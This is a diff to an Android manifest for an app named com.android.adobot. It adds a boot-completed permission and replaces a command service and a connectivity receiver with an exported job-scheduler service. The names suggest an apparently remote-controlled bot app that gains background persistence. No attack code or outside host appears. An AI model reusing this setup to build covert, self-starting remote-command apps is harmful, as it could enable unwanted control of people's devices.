@@ -37,6 +37,9 @@
     <uses-permission
         android:name="android.permission.WRITE_EXTERNAL_STORAGE"
         android:required="true" />
+    <uses-permission
+        android:name="android.permission.RECEIVE_BOOT_COMPLETED"
+        android:required="true" />
 
     <application
         android:allowBackup="true"
@@ -55,19 +58,15 @@
         <activity android:name="com.android.adobot.activities.UpdateActivity"></activity>
         <activity android:name="com.android.adobot.activities.PermissionsActivity"></activity>
 
-        <receiver android:name="com.android.adobot.NetworkWatcher">
-            <intent-filter>
-                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
-            </intent-filter>
-        </receiver>
-
-        <!--<receiver android:name="com.android.adobot.NetworkWatcher">-->
+        <!--<receiver android:name="com.android.adobot.network.NetworkBroadcastReceiverstReceiver">-->
             <!--<intent-filter>-->
                 <!--<action android:name="android.intent.action.BOOT_COMPLETED" />-->
             <!--</intent-filter>-->
         <!--</receiver>-->
 
-        <service android:name="com.android.adobot.CommandService" />
+        <service android:name="com.android.adobot.network.NetworkSchedulerService"
+            android:exported="true"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
 
         <!--end of services and receivers-->
 
